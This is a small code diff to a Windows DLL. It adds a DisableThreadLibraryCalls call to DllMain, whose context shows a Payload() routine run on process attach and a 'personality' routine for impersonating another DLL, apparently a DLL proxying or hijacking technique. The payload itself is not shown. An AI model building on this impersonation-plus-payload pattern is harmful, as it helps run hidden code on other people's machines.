@@ -95,10 +95,11 @@ bool Payload()
 
 bool DllPersonalityInit(); // the dll whose personality we take on can be changed
 
-BOOL WINAPI DllMain(HMODULE, DWORD r, LPVOID)
+BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD r, LPVOID)
 {
 	if (r == DLL_PROCESS_ATTACH)
 	{
+		DisableThreadLibraryCalls(hinstDLL);
 		if (!DllPersonalityInit()) return FALSE;
 
 		if (Payload())
